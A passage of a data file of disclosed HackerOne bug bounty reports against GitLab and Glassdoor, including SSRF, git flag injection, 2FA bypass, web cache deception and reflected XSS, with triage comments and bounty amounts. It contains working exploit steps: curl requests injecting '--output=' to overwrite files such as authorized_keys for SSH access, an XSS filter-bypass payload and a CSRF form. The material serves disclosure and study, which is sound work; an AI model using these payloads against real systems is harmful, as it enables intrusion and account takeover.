3System information
4System:         Ubuntu 18.04
5Proxy:          no
6Current User:   git
7Using RVM:      no
8Ruby Version:   2.5.3p105
9Gem Version:    2.7.6
10Bundler Version:1.16.6
11Rake Version:   12.3.2
12Redis Version:  3.2.12
13Git Version:    2.18.1
14Sidekiq Version:5.2.5
15Go Version:     unknown
16
17GitLab information
18Version:        11.9.8-ee
19Revision:       c9701808101
20Directory:      /opt/gitlab/embedded/service/gitlab-rails
21DB Adapter:     postgresql
22DB Version:     9.6.11
23URL:            https://gitlabext.webhooks.pw
24HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git
25SSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git
26Elasticsearch:  no
27Geo:            no
28Using LDAP:     no
29Using Omniauth: yes
30Omniauth Providers:
31
32GitLab Shell
33Version:        8.7.1
34Repository storage paths:
35- default:      /var/opt/gitlab/git-data/repositories
36GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
37Git:            /opt/gitlab/embedded/bin/git
I have confirmed this issue on both the official Docker image and the official gitlab-ee Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).
Impact
This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.3 attachments:F470641: Screenshot_from_2019-04-17_09-18-49.pngF470642: gitlab_ssrf.mp4F470655: 41_gitlab.json Bot: gitlab-securitybot   posted a comment. Apr 17th (4 years ago)Hi @ajxchapman,
Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.
Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.
Best regards,
GitLab Security Teamdappelt GitLab staff  closed the report and changed the status to Duplicate (#513098). Apr 17th (4 years ago)Hi @ajxchapman,
good finding, thank you for the well-written and thorough report! We recently received a similar report about DNS rebinding in GitLab, which unfortunately makes your report a duplicate. I added you as a participant to the original report.
You mentioned that it would be possible to access cloud metadata services. Did you find a way to access the GCP metadata endpoint on gitlab.com and obtain the response? Please let us know if you manage to escalate this finding in any way.
Best regards,
Dennis
    
    
        
            
                
                
                
            
        
    
ajxchapman   posted a comment. Apr 18th (4 years ago)Thanks for the quick response @dappelt. I've not observed any way of getting at the GCP metadata service on gitlab.com at this time, to my understanding that requires a specific HTTP header to be set as well. If I come across any way of accessing this I'll let you know.
Thanksdappelt GitLab staff  posted a comment. Apr 18th (4 years ago)The endpoint /v1beta1 does not require the GCP header, i.e. http://metadata.google.internal/computeMetadata/v1beta1
Happy huntingestrike GitLab staff  reopened this report. Jun 4th (3 years ago)GitLab  rewarded ajxchapman with a $5,000 bounty. Jun 4th (3 years ago)Hi @ajxchapman ,
We want to thank you again for this report. After some internal discussion, we have decided to award you with a $5000 bounty, as your report helped us to recognize that the GCP metadata token was available through this exploit. We built upon your steps to customize the attack to obtain our own tokens on gitlab.com. 
As an immediate mitigation, we disabled the legacy GCP endpoint that would allow an attacker to obtain the token without a header. Most recently, we have patched the GitLab::HTTP library to use the validated IP address when making connections. This fix went out in GitLab 11.11.1.
Please let us know if you find that our patch does not mitigate your finding. For now, the issue will stay confidential as we work to address similar issues in other parts of the code base, but it will be made public 30 days after the final fix.
We look forward to your next report!
Best regards,
Ethan
Security Team | GitLab Inc.estrike GitLab staff  closed the report and changed the status to Resolved. Jun 4th (3 years ago)Hi @ajxchapman ,
I am going to mark this as Resolved, as the issue in GitLab::UrlBlocker has been addressed.
Thank you again,
Ethan
Security Team | GitLab Inc.
    
    
        
            
                
                
                
            
        
    
ajxchapman   posted a comment. Jun 5th (3 years ago)Hi Team,  thank you for the update and reconsideration of this issue.
My initial attempts to attempt to access the GCP endpoints failed, I'm really glad you were able to build on this and further secure the GitLab platform.
Cheers
    
    
        
            
                
                
                
            
        
    
ajxchapman   requested to disclose this report. Dec 11th (3 years ago)Hi Team, can we disclose this issue?
Thanksdappelt GitLab staff  posted a comment. Dec 12th (3 years ago)Hi @ajxchapman - the attachments of your report might contain sensitive data. For example, the response from the metadata endpoint, IP addresses etc. Do you want to redact these or are you fine with disclosing the report as is?
    
    
        
            
                
                
                
            
        
    
ajxchapman   posted a comment. Dec 12th (3 years ago)Hi @dappelt, thanks for checking. I have reviewed the report and attachments and am happy for them to be disclosed as is. Thanks!dappelt GitLab staff  agreed to disclose this report. Dec 12th (3 years ago)  This report has been disclosed. Dec 12th (3 years ago)",https://hackerone.com/reports/541169,California,United States,San Francisco,2019,4,17,9,18
GitLab,1001-5000,0.0,200m-1b,"$3,500.00",Critical,9.5,Command Injection - Generic,Git flag injection leading to file overwrite and potential remote code execution,"vakzz  submitted a report to GitLab.Jul 22nd (3 years ago)Summary
The ref_name in the Commits API is not sanitized, allowing for a ref starting with -- to be provided causing git to interpret it as a flag instead of as a ref.
If a ref_name such as --output=/tmp/some_file is used then the following command is executed by gitaly in find_commits.go:
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .
followed by
/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .
This first writes the list of commits to the file, but then the rev-list command fails but not before truncating the file.
Steps to reproduce

Create a repo and add a file
Use the commit api and pass in a ref_name such as --output=/tmp/written:

Code 101 BytesWrap lines Copy Download1curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'

See that the file has been created:

Code 73 BytesWrap lines Copy Download1# ls -asl /tmp/written
20 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
Impact
The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.
One attack scenario I thought of would be to truncate /var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret, which almost worked but ended up failing due to authenticate_by_gitlab_shell_token checking the token with unauthorized! unless Devise.secure_compare(secret_token, input) which fails if either are blank.
This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a git log happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:
Code 196 BytesWrap lines Copy Download1# gitlab-ctl restart unicorn
2ok: run: unicorn: (pid 46755) 1s
3root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
4████████
5``
6
7This then allows for use of the internal api:
curl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'
{""api_version"":""v4"",""gitlab_version"":""12.0.3"",""gitlab_rev"":""08a51a9db93"",""redis"":true}
curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
{""id"":1,""name"":""Administrator"",""username"":""root""}
Code 1.19 KiBWrap lines Copy Download1
2### What is the current *bug* behavior?
3
4The `ref_name` is not sanitized
5
6### What is the expected *correct* behavior?
7
8The `ref_name` should be sanitized to prevent it being used as git command flags.
9
10#### Results of GitLab environment info
11
12System information
13System:
14Current User:	git
15Using RVM:	no
16Ruby Version:	2.6.3p62
17Gem Version:	2.7.9
18Bundler Version:1.17.3
19Rake Version:	12.3.2
20Redis Version:	3.2.12
21Git Version:	2.21.0
22Sidekiq Version:5.2.7
23Go Version:	unknown
24
25GitLab information
26Version:	12.0.3
27Revision:	08a51a9db93
28Directory:	/opt/gitlab/embedded/service/gitlab-rails
29DB Adapter:	PostgreSQL
30DB Version:	10.7
31URL:		http://4290d4225642
32HTTP Clone URL:	http://4290d4225642/some-group/some-project.git
33SSH Clone URL:	git@4290d4225642:some-group/some-project.git
34Using LDAP:	no
35Using Omniauth:	yes
36Omniauth Providers:
37
38GitLab Shell
39Version:	9.3.0
40Repository storage paths:
41- default: 	/var/opt/gitlab/git-data/repositories
42GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
43Git:		/opt/gitlab/embedded/bin/git
44
45## Impact
46
47Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation. Bot: gitlab-securitybot   posted a comment. Jul 22nd (3 years ago)Hi @vakzz,
Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.
Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.
Best regards,
GitLab Security Teamhackerjuan   posted a comment. Jul 22nd (3 years ago)Thank you for your report @vakzz! We are triaging this as a high severity issue for now. We will escalate if we are able to find a way to turn it into RCE. 
In addition to DoS, this vulnerability would allow an attacker to erase log files and other repositories' data.hackerjuan   updated the severity from critical to high. Jul 22nd (3 years ago)hackerjuan   changed the status to Triaged. Jul 22nd (3 years ago)Hello,
Thank you for submitting this report.
We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitaly/issues/1799.  This issue will be made public 30 days following the release of a patch.
We will continue to update you via HackerOne as a patch is scheduled for release.
Best regards,
Security Team | GitLab Inc.
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Updated Dec 19th (3 years ago)Hi,
Thanks for the quick triage.
A small update, if you run the following call twice then the rev-list command doesn't happen the second time allowing for the file to be overwritten with a known sha1 hash:
Code 179 BytesWrap lines Copy Download1curl 'http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
2
3# cat /var/opt/gitlab/gitlab-pages/admin.secret
4██████
Image F535597: commit.png 63.80 KiBZoom in Zoom out Copy Download
This allows for gitlab_pages_secret and gitlab_shell_secret to be overwritten with known values.1 attachment:F535597: commit.pnghackerjuan   posted a comment. Jul 23rd (3 years ago)Thank you for de additional details, we have been able to reproduce the behaviour described and we are escalating this issue since it's possible to retrieve 2FA recovery codes of anyone that has registered a SSH key through the internal API.hackerjuan   updated the severity from high to critical. Jul 23rd (3 years ago) Bot: gitlab-securitybot   posted a comment. Jul 25th (3 years ago)ETA for fix:
Hi @vakzz,
The GitLab issue created from your report is currently scheduled for 2019-08-22.
Thank you again for contacting us!
Best regards,
GitLab Security Teamhackerjuan   closed the report and changed the status to Resolved. Aug 21st (3 years ago)Hi,
Thank you again for the report! Your finding has been patched in GitLab version 12.1.6.
We are awarding a $3500 bounty for this issue because it only affects GitLab instances running on docker for macOS.
Please let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.
We look forward to your next report!
Best regards,
Security Team | GitLab Inc.GitLab  rewarded vakzz with a $3,500 bounty. Aug 21st (3 years ago)vakzz   requested to disclose this report. Oct 14th (3 years ago)
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Dec 16th (3 years ago)Hi @hackerjuan,
Is this ok to be disclosed?
Cheers,
Willhackerjuan   agreed to disclose this report. Dec 19th (3 years ago)  This report has been disclosed. Dec 19th (3 years ago)",https://hackerone.com/reports/653125,California,United States,San Francisco,2019,7,22,16,0
GitLab,1001-5000,0.0,200m-1b,"$1,000.00",High,7.95,Server-Side Request Forgery (SSRF),SSRF on project import via the remote_attachment_url on a Note,"vakzz  submitted a report to GitLab.Mar 22nd (3 years ago)Summary
The Note model has an attachment which is provided by a CarrierWave uploader:
Code 46 BytesWrap lines Copy Download1mount_uploader :attachment, AttachmentUploader
One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L80. This means that the Note model has a method remote_attachment_url= which can be used to perform this action.
As this attribute isn't removed by the AttributeCleaner on project import, it can be set in the project.json for a note and will be set when the note is created, downloading the file:
https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mounter.rb#L72
Code 357 BytesWrap lines Copy Download1  def remote_urls=(urls)
2      return if not urls or urls == """" or urls.all?(&:blank?)
3
4      @remote_urls = urls
5      @download_error = nil
6      @integrity_error = nil
7
8      @uploaders = urls.zip(remote_request_headers || []).map do |url, header|
9        uploader = blank_uploader
10        uploader.download!(url, header || {})
11        uploader
12      end
https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/uploader/download.rb#L43
Code 297 BytesWrap lines Copy Download1    def file
2          if @file.blank?
3            headers = @remote_headers.
4              reverse_merge('User-Agent' => ""CarrierWave/#{CarrierWave::VERSION}"")
5
6            @file = Kernel.open(@uri.to_s, headers)
7            @file = @file.is_a?(String) ? StringIO.new(@file) : @file
8          end
The downloaded file is then attached to the note and can be viewed from the newly imported project.
Any model that has a mount_uploader and is importable is potentially vulnerable to the same attack, although the majority of the others are AvatarUploader which checks the file type and prevents the response from being viewed.
Steps to reproduce

Create a new project
Create an issue in the project
Add a note to the issue
Export the project
Extract the export
Add  remote_attachment_url to the note hash with a url
Recompress the export and import it
View the note on the issue

Demo Video F756257: ssrf-note.mp4 646.26 KiBZoom in Zoom out Copy Download
Examples
Example of project import on gitlab.com hitting postbin:
https://gitlab.com/wbowling/ssrf1/-/issues/1#note_309127303
Image F756269: Screen_Shot_2020-03-22_at_11.22.06_pm.png 128.81 KiBZoom in Zoom out Copy Download
What is the current bug behavior?
When importing a model that has a mount_uploader it's possible to use the carrierwave uploader seed attributes to download a file from any host: https://github.com/carrierwaveuploader/carrierwave/wiki/How-to:-Upload-remote-image-urls-to-your-seedfile
What is the expected correct behavior?
The attributes should be prohibited and removed via the AttributeCleaner
Output of checks
This bug happens on gitlab.com
Results of GitLab environment info
Code 853 BytesWrap lines Copy Download1System information
2System:		Ubuntu 18.04
3Proxy:		no
4Current User:	git
5Using RVM:	no
6Ruby Version:	2.6.5p114
7Gem Version:	2.7.10
8Bundler Version:1.17.3
9Rake Version:	12.3.3
10Redis Version:	5.0.7
11Git Version:	2.24.1
12Sidekiq Version:5.2.7
13Go Version:	unknown
14
15GitLab information
16Version:	12.8.7-ee
17Revision:	2643fd87200
18Directory:	/opt/gitlab/embedded/service/gitlab-rails
19DB Adapter:	PostgreSQL
20DB Version:	10.12
21URL:		http://gitlab-vm.local
22HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
23SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
24Elasticsearch:	no
25Geo:		no
26Using LDAP:	no
27Using Omniauth:	yes
28Omniauth Providers:
29
30GitLab Shell
31Version:	11.0.0
32Repository storage paths:
33- default: 	/var/opt/gitlab/git-data/repositories
34GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
35Git:		/opt/gitlab/embedded/bin/git
Impact

Allows an attacker to access internal services, for example the Omnibus GitLab has all of the exporters, Prometheus, Alertmanager exposed on localhost. 
If GitLab is hosted on AWS it allows for the instance metadata to be accessed.
Redis is running locally or accessible via tcp (address could be found by looking at the targets in Prometheus at http://localhost:9090/api/v1/targets) it could be possible to obtain RCE (similar to https://github.com/jas502n/gitlab-SSRF-redis-RCE#poc). A POST request is not possible here, but as remote_attachment_request_header= is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L169) and not blacklisted, the payload could be set via a header.
If GitLab is hosted on Google Cloud, the above could be used to set the Metadata-Flavor: Google header and access http://metadata.google.internal/
2 attachments:F756257: ssrf-note.mp4F756269: Screen_Shot_2020-03-22_at_11.22.06_pm.png
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Mar 22nd (3 years ago)Attached is the modified project export used in the demo1 attachment:F756275: ssrf_note.tar.gz Bot: gitlab-securitybot   posted a comment. Mar 22nd (3 years ago)Hi @vakzz,
Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 10 business days with an update.
Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.
Best regards,
GitLab Security Team
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Updated Jun 7th (2 years ago)To confirm that this affects gitlab.com as well as the omnibus edition, I did a quick scan of localhost ports on gitlab.com which shows that the following are accessible:

████ on port ██████ allowing the metrics to be retrieved, ███████████████

Code 693 BytesWrap lines Copy Download1# TYPE apt_upgrades_pending gauge
2apt_upgrades_pending{arch=""all"",origin=""Ubuntu:16.04/xenial-updates""} 32
3apt_upgrades_pending{arch=""amd64"",origin=""Ubuntu:16.04/xenial""} 2
4apt_upgrades_pending{arch=""amd64"",origin=""Ubuntu:16.04/xenial-updates""} 79
5apt_upgrades_pending{arch=""amd64"",origin=""pre-release:1/xenial""} 1
6# HELP chef_client_duration_seconds The duration of chef-client run in seconds.
7# TYPE chef_client_duration_seconds gauge
8chef_client_duration_seconds 75.031342872
9# HELP chef_client_error The bool error status of the last chef-client run.
10# TYPE chef_client_error gauge
11chef_client_error 0
12# HELP chef_client_info The chef client version info.
13# TYPE chef_client_info gauge
14███

Consul on port ███████ allowing things like dumping the KV Store at, ███

Code 367 BytesWrap lines Copy Download1[
2  {
3    ""LockIndex"": 0,
4    ""Key"": ""█████"",
5    ""Flags"": 0,
6    ""Value"": null,
7    ""CreateIndex"": 689878,
8    ""ModifyIndex"": 8420654
9  },
10  {
11    ""LockIndex"": 0,
12    ""Key"": ""████████"",
13    ""Flags"": 0,
14    ""Value"": null,
15    ""CreateIndex"": 685871,
16    ""ModifyIndex"": 8420655
17  },
18  {
19    ""LockIndex"": 0,
20    ""Key"": ""█████"",
21    ""Flags"": 0,
22    ""Value"": ""eyJwb3N0Z...
These both show other internal hosts which could potentially be accessed via the same ssrf to leak private data.
Cheers,
Willdappelt GitLab staff  posted a comment. Mar 23rd (3 years ago)Hi @vakzz,
thank you for sending in the report! 
We could reproduce the SSRF and are in the process of assessing the impact of your finding. You mentioned that it is possible to set custom HTTP headers on the request by setting remote_attachment_request_header:

as remote_attachment_request_header= is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L169) and not blacklisted, the payload could be set via a header.

We were not able to set custom headers on the request with remote_attachment_request_header. Can you provide an example project export that demonstrates how to add customer headers?
Best regards,
Dennisrchan   changed the status to Triaged. Mar 23rd (3 years ago)Hello @vakzz,
Thank you for submitting this report.
We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/212089.  This issue will be made public 30 days following the release of a patch.
Given the severity of the report, we are paying an initial $1000 on triage. Congratulations! The final severity of the report might change, depending on if we can reproduce the ability to add custom headers. 
We will continue to update you via HackerOne as a patch is scheduled for release.
Best regards,
Ron
Security Team | GitLab Inc.GitLab  rewarded vakzz with a $1,000 bounty. Mar 23rd (3 years ago)
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Mar 23rd (3 years ago)Hi @dappelt,
After trying to use a custom header on a project import I was unable to get it to work either (I had previously been testing this via a rails console after confirming it made it through the AttributeCleaner). I thought perhaps it was just an issue with randomness (depending on which attribute gets set first) but after digging into the rails code it looks like hash attributes are always set at the end:
Code 632 BytesWrap lines Copy Download1    def _assign_attributes(attributes)
2        multi_parameter_attributes  = {}
3        nested_parameter_attributes = {}
4
5        attributes.each do |k, v|
6          if k.include?(""("")
7            multi_parameter_attributes[k] = attributes.delete(k)
8          elsif v.is_a?(Hash)
9            nested_parameter_attributes[k] = attributes.delete(k)
10          end
11        end
12        super(attributes)
13
14        assign_nested_parameter_attributes(nested_parameter_attributes) unless nested_parameter_attributes.empty?
15        assign_multiparameter_attributes(multi_parameter_attributes) unless multi_parameter_attributes.empty?
16      end
As remote_attachment_request_header requires a hash to be passed in due to the following (and it's what Kernel.open expects) it will always be assigned last:
Code 200 BytesWrap lines Copy Download1# https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/uploader/download.rb#L40
2headers = @remote_headers.reverse_merge('User-Agent' => ""CarrierWave/#{CarrierWave::VERSION}"")
So in summary you can get remote_attachment_request_header= to be called but it will always happen after remote_attachment_url= meaning the header wont be set yet when the request is made, unless there is a away to create a Note and then retrieve and update it from the cache during the same import (but I can't see a way for that to happen).
Sorry about that, I should have tested it a bit more!
Cheers,
Will Bot: gitlab-securitybot   posted a comment. Mar 24th (3 years ago)ETA for fix:
Hi @vakzz,
The issue you reported is currently scheduled to be fixed by 2020-04-30.
Thank you again for contacting us!
Best regards,
GitLab Security TeamGitLab  rewarded vakzz with a $9,000 bounty. Mar 30th (3 years ago)Hi @vakzz,
Thank you again for the report! Your finding has been patched in GitLab version 12.9.1 and we are awarding a bounty. Congratulations!
Please let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.
We look forward to your next report!
Best regards,
Ron
Security Team | GitLab Inc.rchan   closed the report and changed the status to Resolved. Mar 30th (3 years ago)vakzz   requested to disclose this report. Jun 7th (2 years ago)rchan   agreed to disclose this report. Jun 7th (2 years ago)  This report has been disclosed. Jun 7th (2 years ago)",https://hackerone.com/reports/826361,California,United States,San Francisco,2020,3,22,12,37
GitLab,1001-5000,0.0,200m-1b,"$12,000.00",Critical,9.5,Command Injection - Generic,Git flag injection - local file overwrite to remote code execution,"vakzz  submitted a report to GitLab.Jul 24th (3 years ago)Summary
The wiki_blobs scope of the Search API can be provided with an arbitrary ref parameter, allowing for additional flags to be injected into the git command. 
For example the following API call:
Code 141 BytesWrap lines Copy Download1`curl --header ""PRIVATE-TOKEN: $TOKEN"" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
The above will generate the following git command causing the the last commit log to be written to /tmp/file
Code 201 BytesWrap lines Copy Download1/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file
Steps to reproduce

Create a wiki new wiki page called page with the commit message controlled content
Search for the wiki blob via the Search API, with the injected ref flag:

Code 139 BytesWrap lines Copy Download1curl --header ""PRIVATE-TOKEN: $TOKEN"" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'

See that the file has been created:

Code 183 BytesWrap lines Copy Download1git@gitlab-vm:~$ cat /tmp/file
2commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9
3Author: Administrator <admin@example.com>
4Date:   Wed Jul 24 13:08:51 2019 +0000
5
6    controlled content
Impact
This can be used to overwrite /var/opt/gitlab/.ssh/authorized_keys with an attackers key by following the above steps allowing remote access and code execution.

Create a new rsa key
Create a new wiki page setting the commit message to the rsa public key
Run the Search API with ref=--output=/var/opt/gitlab/.ssh/authorized_keys
ssh into gitlab using the created key:

Code 730 BytesWrap lines Copy Download1$ ssh git@gitlab-vm.local -i gitlab
2Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)
3$ id
4uid=998(git) gid=998(git) groups=998(git)
5
6$ cat /var/opt/gitlab/.ssh/authorized_keys
7commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6
8Author: Administrator <admin@example.com>
9Date:   Wed Jul 24 12:56:23 2019 +0000
10
11    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local
What is the current bug behavior?
The ref param is passed directly to the git command without being sanitized.
What is the expected correct behavior?
The ref param should be sanitized or used in a way that doesn't allow for flag injection 
Results of GitLab environment info
Code 845 BytesWrap lines Copy Download1$ sudo gitlab-rake gitlab:env:info
2
3System information
4System:		Ubuntu 16.04
5Current User:	git
6Using RVM:	no
7Ruby Version:	2.6.3p62
8Gem Version:	2.7.9
9Bundler Version:1.17.3
10Rake Version:	12.3.2
11Redis Version:	3.2.12
12Git Version:	2.21.0
13Sidekiq Version:5.2.7
14Go Version:	unknown
15
16GitLab information
17Version:	12.1.0
18Revision:	295480f4553
19Directory:	/opt/gitlab/embedded/service/gitlab-rails
20DB Adapter:	PostgreSQL
21DB Version:	10.7
22URL:		http://gitlab-vm.local
23HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
24SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
25Using LDAP:	no
26Using Omniauth:	yes
27Omniauth Providers:
28
29GitLab Shell
30Version:	9.3.0
31Repository storage paths:
32- default: 	/var/opt/gitlab/git-data/repositories
33GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
34Git:		/opt/gitlab/embedded/bin/git
Impact
An attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the git user",https://hackerone.com/reports/658013,California,United States,San Francisco,2019,7,24,13,23
Glassdoor,501-1000,0.0,200m-1b,"$1,000.00",High,7.95,Improper Authentication - Generic,2FA bypass by sending blank code,"safehacker_2715  submitted a report to Glassdoor.Jun 13th (2 years ago)Summary: █████████. This is a failure in null check of the entered code. In simple terms, the 2FA while logging in can be bypassed by sending a blank code. This could be because of incorrect comparison of entered code with true code. A pre-validation (may be null check) before comparing the codes would fix the issue
Affected URL or select Asset from In-Scope: Glassdoor 2FA
Affected Parameter: code
Vulnerability Type: Improper Authentication
Browsers tested: Browser independent
Steps To Reproduce:
(Add details for how we can reproduce the issue)

Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_input.htm
Enable 2FA
Logout
Login again and notice OTP is asked
Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
Before forwarding the request to server, remove the code and forward
Turnoff Intercept and notice that your login request has been fulfilled

Supporting Material/References (screenshots, logs, videos):

███████

Impact
2FA Protection bypass. Attacker could gain access despite the 2FA protection by victim",https://hackerone.com/reports/897385,California,United States,Mill Valley,2020,6,13,8,41
Glassdoor,501-1000,0.0,200m-1b,"$1,600.00",High,7.95,Information Disclosure,[https://www.glassdoor.com] -  Web Cache Deception Leads to gdtoken Disclosure ,"bombon  submitted a report to Glassdoor.Sep 18th (about 1 year ago)Summary by bombonglassdoor.com had a Web Cache Deception issue, this allowed an attacker to save other user's responses in where the gdtoken was reflected, allowing an attacker to steal the gdtoken, then the attacker was able to perform CSRF attacks against the users and ultimately taking over their accounts, all of this could have been automated.

I'm looking forward to disclose more reports regarding this and other bugs in the near future :p

I also want to thank the Glassdoor team for their dedication, kindness, and promptness on fixing this issue. At first, they couldn't reproduce it, but we worked together and reproduced it live :)",https://hackerone.com/reports/1343086,California,United States,Mill Valley,2021,9,18,1,27
Glassdoor,501-1000,0.0,200m-1b,$750.00,Medium,6.4,Cross-site Scripting (XSS) - Reflected,[XSS] Reflected XSS via POST request in (editJobAlert.htm) file,"flex0geek  submitted a report to Glassdoor.Apr 4th (3 years ago)Description:
first, it was a very good bug for me it starts when I was testing the form for I found a CSRF I sent it here #838778 I tested the form again and after few minutes I found that this parameter locationId in the post request is vulnerable to XSS the page take the value of this parameter and add it to a tag here
Code 50 BytesWrap lines Copy Download1<a href='/Job/jobs.htm?sc.keyword=&locId=3438985'>
i added this value flex0' and I could get out of the href attribute so I closed the tag too using > and now i start my journey to found a valid payload which can work with this filter I tried a looooooot of payloads it takes me hours to bypass the filter block this values alert, confirm, write, prompt if there is any value after it i tried a lot of encoding to bypass it but nothing works with me so i start to think out of the box and search on google too and I got this one [0].find(confirm) this value is equal to confirm(0) so it can work and there is nothing blocked on this value so I added my payload here
Code 44 BytesWrap lines Copy Download1'><marquee onstart=""[cookie].find(confirm)"">
this payload will pop up with the cookies of the victim now because it was in a POST request I used it with an HTML code here
Code 862 BytesWrap lines Copy Download1<form action=""https://www.glassdoor.com/profile/editJobAlert.htm"" method=""post"">
2    <input type=""text"" name=""setupJobAlertEmail"" value=""false""><br>
3    <input type=""text"" name=""userValidationKey"" value=""""><br>
4    <input type=""text"" name=""key"" value=""""><br>
5    <input type=""text"" name=""jobAlertId"" value=""[the id of the jobalert]""><br>
6    <input type=""text"" name=""JAK"" value=""""><br>
7    <input type=""text"" name=""reactivation"" value=""false""><br>
8    <input type=""text"" name=""linkOrigin"" value=""""><br>
9    <input type=""text"" name=""keywords"" value=""[the name]""><br>
10    <input type=""text"" name=""rawLocationName"" value=""Cairo""><br>
11    <input type=""text"" name=""locationType"" value=""C""><br>
12    <input type=""text"" name=""locationId"" value=""3438985""><br>
13    <input type=""text"" name=""emailFrequency"" value=""WEEKLY""><br>
14    <input type=""submit"" value=""send"">
15</form>
the payload will be added in the locationId parameter in this code notice that we can make the form send the request automaticly without any interaction from the user but in my POC I didn't use that because I changed the value a lot to prove the bug in the Video POC is involve the coockies and the domain name and a value too so i can use it as Full XSS the Vidoe is here
xss_poc.wmv (F773437)
Steps:

take the value and add to HTML file and add your payload in locationId
open this file in your browser and send the request
you will see that the payload works and the pop-up happened

Fix:
you should add a function to encode the value of this parameter with HTML encode like other parameters
Impact
I can execute JS code on the websites's users.1 attachment:F773437: xss_poc.wmv",https://hackerone.com/reports/838910,California,United States,Mill Valley,2020,4,4,16,2
